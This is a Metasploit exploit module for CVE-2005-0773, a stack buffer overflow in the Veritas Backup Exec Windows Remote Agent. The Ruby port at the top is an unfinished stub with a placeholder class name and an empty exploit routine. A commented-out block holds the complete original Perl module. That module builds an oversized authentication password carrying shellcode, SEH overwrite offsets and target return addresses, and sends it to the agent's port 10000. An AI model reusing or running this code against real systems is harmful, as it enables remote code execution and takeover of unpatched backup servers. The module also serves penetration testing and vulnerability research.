require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Veritas Backup Exec Windows Remote Agent Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the Veritas
				BackupExec Windows Agent software. This vulnerability occurs
				when a client authentication request is received with type
				'3' and a long password argument. Reliable execution is
				obtained by abusing the stack overflow to smash a SEH
				pointer.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2005-0773'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=272&type=vulnerabilities'],
					[ 'URL', 'http://seer.support.veritas.com/docs/276604.htm'],
					[ 'MIL', '9'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::backupexec_agent;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  	=> 'Veritas Backup Exec Windows Remote Agent Overflow',
	'Version'  	=> '$Revision$',
	'Authors' 	=> [ 'Thor Doomen <syscall [at] hushmail.com>' ],
	'Arch'  	=> [ 'x86' ],
	'OS'    	=> [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
	'Priv'  	=> 1,

	'AutoOpts'	=> { 'EXITFUNC' => 'process' },

	'UserOpts'	=>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 10000],
	  },

	'Payload' =>
	  {
		'Space'     => 1024,
		'BadChars'  => "\x00",
		'Keys'		=> ['+ws2ord'],
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the Veritas BackupExec Windows
	Agent software. This vulnerability occurs when a client authentication request
	is received with type '3' and a long password argument. Reliable execution is 
	obtained by abusing the stack overflow to smash a SEH pointer.
}),

	'Refs' =>
	  [
		['CVE', '2005-0773' ],
		['URL', 'http://www.idefense.com/application/poi/display?id=272&type=vulnerabilities'],
		['URL', 'http://seer.support.veritas.com/docs/276604.htm' ],
		['MIL', '9'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Veritas BE 9.0/9.1/10.0 (All Windows)',  0x0140f8d5, 0x014261b0 ],
		['Veritas BE 9.0/9.1/10.0 (Windows 2000)', 0x75022ac4, 0x75022ac4 ],
	  ],

	'Keys' => ['veritas'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

# Version 4.2 -> 9.1
# Version 5.1 -> 10.0
sub Check {
	my $self = shift;
	my ($vend, $prod, $vers) = $self->GetVersion;

	if (! $vend) {
		$self->PrintLine("[*] Could not determine the version number");
		return $self->CheckCode('Unknown');
	}

	$self->PrintLine("[*] $prod Version $vers ($vend)");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	my $res = $s->Recv(4, 5);
	$res = $s->Recv(unpack('N', $res) - 0x80000000, 5);

	my $username = "X" x 512;
	my $password = Pex::Text::PatternCreate(8192);

	# Place our payload early in the request and jump backwards into it
	substr($password, 3536-length($shellcode), length($shellcode), $shellcode);

	# This offset is required for version 10.0
	substr($password, 3536, 2, "\xeb\x06");
	substr($password, 3540, 4, pack('V', $target->[2]) );
	substr($password, 3544, 5, "\xe9" . pack('V', -1037));

	# This offset is required for version 9.0/9.1
	substr($password, 4524, 2, "\xeb\x06");
	substr($password, 4528, 4, pack('V', $target->[1]) );
	substr($password, 4532, 5, "\xe9" . pack('V', -2025));

	my $conn_auth =
	  pack('N', 1).         # Sequence number
	  pack('N', time()).    # Current time
	  pack('N', 0).         # Message type (request)
	  pack('N', 0x901).     # Message name (connect_client_auth)
	  pack('N', 0).         # Reply sequence number
	  pack('N', 0).         # Error status
	  pack('N', 3).         # Authentication type
	  pack('N', length($username)).
	  $username.
	  pack('N', length($password)).
	  $password.
	  pack('N', 4);

	$self->PrintLine( "[*] Sending authentication request of " . length($conn_auth) . " bytes..." );
	$s->Send(pack('N', 0x80000000 + length($conn_auth)) . $conn_auth);

	return;
}

sub GetVersion {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return undef;
	}

	my $res = $s->Recv(4, 5);
	return undef if ! $res;
	$res = $s->Recv(unpack('N', $res) - 0x80000000, 5);

	my $serv_info =
	  pack('N', 1).         # Sequence number
	  pack('N', time()).    # Current time
	  pack('N', 0).         # Message type (request)
	  pack('N', 0x108).     # Message name (connect_client_auth)
	  pack('N', 0).         # Reply sequence number
	  pack('N', 0);         # Error status

	$s->Send(pack('N', 0x80000000 + length($serv_info)) . $serv_info);
	$res = $s->Recv(4, 5);
	return undef if ! $res;
	
	$res = $s->Recv(unpack('N', $res) - 0x80000000, 5);
	$s->Close;

	# Skip past the protocols headers
	$res         = substr($res, 28);

	# Vendor
	my $vend_len = unpack('N', substr($res, 0, 4));
	my $vend     = substr($res, 4, $vend_len);
	$res         = substr($res, 4 + $vend_len + 1);

	# Product
	my $prod_len = unpack('N', substr($res, 0, 4));
	my $prod     = substr($res, 4, $prod_len);
	$res         = substr($res, 4 + $prod_len + 1);

	# Version
	my $vers_len = unpack('N', substr($res, 0, 4));
	my $vers     = substr($res, 4, $vers_len);
	$res         = substr($res, 4 + $vers_len + 1);

	return ($vend, $prod, $vers);
}

1;

=end


end
end	
